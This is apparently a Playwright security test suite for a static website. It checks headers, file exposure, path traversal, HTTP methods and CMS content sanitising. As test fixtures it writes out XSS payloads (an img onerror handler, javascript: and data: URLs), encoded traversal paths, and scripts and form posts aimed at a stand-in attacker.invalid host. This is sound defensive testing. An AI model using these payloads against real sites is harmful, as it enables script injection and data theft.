const { test, expect } = require("@playwright/test");
const fs = require("node:fs");
const path = require("node:path");
const { isolate } = require("./visual-helpers.cjs");
const deployment = require("../../vercel.json");

test("security headers protect pages, assets and errors", async ({
  request,
}) => {
  for (const url of [
    "/",
    "/gallery.html",
    "/kids-play.html",
    "/brand-assets.html",
    "/missing-page",
    "/src/assets/logo.png",
  ]) {
    const response = await request.get(url);
    for (const { key, value } of deployment.headers[0].headers)
      expect(response.headers()[key.toLowerCase()], `${url} ${key}`).toBe(
        value,
      );
    expect(response.headers()["x-powered-by"]).toBeUndefined();
  }
});

test("private files, debug artifacts and malformed paths are not disclosed", async ({
  request,
}) => {
  for (const url of [
    "/.env",
    "/.git/config",
    "/package.json",
    "/package-lock.json",
    "/AGENTS.md",
    "/SECURITY-REVIEW.md",
    "/.next/server/pages/index.html",
    "/_next/static/main.js.map",
    "/%2e%2e%2fpackage.json",
    "/%00",
    "/%5c..%5cpackage.json",
  ]) {
    const response = await request.get(url);
    expect(response.status(), url).toBe(404);
    expect(await response.text()).not.toMatch(
      /BEGIN .*PRIVATE KEY|"dependencies"|\[core\]/,
    );
  }
  expect((await request.get("/%E0%A4%A")).status()).toBe(400);
  for (const method of ["POST", "PUT", "DELETE", "TRACE"]) {
    const response = await request.fetch("/", { method });
    expect(response.status()).toBe(405);
    expect(response.headers().allow).toBe("GET, HEAD");
  }
  const head = await request.head("/missing-head-check");
  expect(head.status()).toBe(404);
  expect((await head.body()).length).toBe(0);
});

test("production output excludes previews, source maps and private files", () => {
  const files = fs
    .readdirSync(path.resolve("out"), { recursive: true })
    .map(String);
  expect(
    files.filter((file) =>
      /(^|\/)(?:\.env(?:\.|$)|\.git(?:\/|$)|node_modules(?:\/|$))|\.map$/.test(
        file,
      ),
    ),
  ).toEqual([]);
  expect(
    files.filter((file) =>
      /(?:error-pages|offline|client-error|maintenance)\.html$|(?:^|\/)(?:40[0-35-9]|4[1-9][0-9]|50[1-9]|51[0-9])\.html$/.test(
        file,
      ),
    ),
  ).toEqual([]);
  expect(fs.readFileSync("out/sitemap.xml", "utf8")).not.toMatch(
    /error-pages|offline|client-error|maintenance|\/404|\/500/,
  );
});

test("CSP blocks inline scripts, external scripts and unauthorized form destinations", async ({
  context,
  page,
}) => {
  await isolate(context);
  await page.addInitScript(() => {
    window.cspViolations = [];
    document.addEventListener("securitypolicyviolation", (event) =>
      window.cspViolations.push(event.violatedDirective),
    );
  });
  await page.goto("/");
  await page.waitForFunction(() => document.documentElement.dataset.etcfReady);
  await page.evaluate(() => {
    const script = document.createElement("script");
    script.textContent = "window.injectedCodeRan = true";
    document.body.append(script);
    const external = document.createElement("script");
    external.src = "https://attacker.invalid/payload.js";
    document.body.append(external);
    const form = document.createElement("form");
    form.action = "https://attacker.invalid/collect";
    form.method = "POST";
    document.body.append(form);
    try {
      form.submit();
    } catch {
      // Firefox can throw an opaque error here. The required form-action
      // violation event below confirms that CSP caused the refusal.
    }
  });
  await expect
    .poll(() =>
      page.evaluate(() => window.cspViolations.includes("form-action")),
    )
    .toBe(true);
  await expect
    .poll(() =>
      page.evaluate(() =>
        window.cspViolations.some((value) => value.startsWith("script-src")),
      ),
    )
    .toBe(true);
  expect(await page.evaluate(() => window.injectedCodeRan)).toBeUndefined();
  expect(await page.evaluate(() => window.location.href)).toMatch(/:8003\/$/);
});

test("CMS text stays text and unsafe links or image trackers are rejected", async ({
  context,
  page,
}) => {
  await context.route("**/*", (route) => {
    const url = new URL(route.request().url());
    if (["localhost", "127.0.0.1"].includes(url.hostname))
      return route.continue();
    if (!url.hostname.endsWith(".sanity.io")) return route.abort();
    const query = url.searchParams.get("query") || "";
    const payload = '<img src=x onerror="window.cmsCodeRan=true">';
    const result = query.includes("eventCard")
      ? {
          title: payload,
          date: "2099-11-14",
          description: payload,
          time: "7 PM",
          venue: "Community church",
          registerURL: "javascript:window.cmsCodeRan=true",
          image: { asset: { url: "https://attacker.invalid/track.gif" } },
        }
      : query.includes("tickerCard")
        ? [
            {
              message: payload,
              link: "data:text/html,<script>alert(1)</script>",
            },
          ]
        : null;
    return route.fulfill({
      contentType: "application/json",
      headers: { "Access-Control-Allow-Origin": "*" },
      body: JSON.stringify({ result }),
    });
  });
  await page.goto("/");
  await expect(page.locator("#event-title")).toContainText("<img src=x");
  await expect(page.locator("#event-title img")).toHaveCount(0);
  await expect(page.locator("#register-link")).toHaveAttribute(
    "href",
    "#newsletter-form",
  );
  await expect(page.locator("#event-image")).toHaveAttribute(
    "src",
    "/images/events/willupdate.png",
  );
  await expect(page.locator("#tickerTrack a")).toHaveCount(0);
  expect(await page.evaluate(() => window.cmsCodeRan)).toBeUndefined();
});
